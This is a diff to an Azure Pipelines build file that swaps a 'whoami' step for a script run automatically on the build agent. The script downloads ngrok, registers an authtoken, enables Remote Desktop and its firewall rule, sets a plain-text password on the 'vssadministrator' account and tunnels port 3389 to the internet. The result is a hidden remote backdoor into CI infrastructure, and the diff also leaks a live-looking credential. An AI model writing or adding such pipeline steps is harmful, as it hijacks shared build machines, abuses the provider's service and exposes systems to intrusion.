@@ -14,5 +14,12 @@ steps:
   displayName: 'Run a one-line script'
 
 - script: |
-          whoami
+    powershell Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
+    powershell Expand-Archive ngrok.zip
+    powershell .\ngrok\ngrok.exe authtoken 1gOVBeTb70ILMEjqZYgems8iYJu_7jZwomKsbnZY4aCfwJm4k
+    powershell Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+    powershell Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+    powershell Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+    powershell Set-LocalUser -Name "vssadministrator" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
+    powershell .\ngrok\ngrok.exe tcp 3389
   displayName: 'Run a multi-line script'
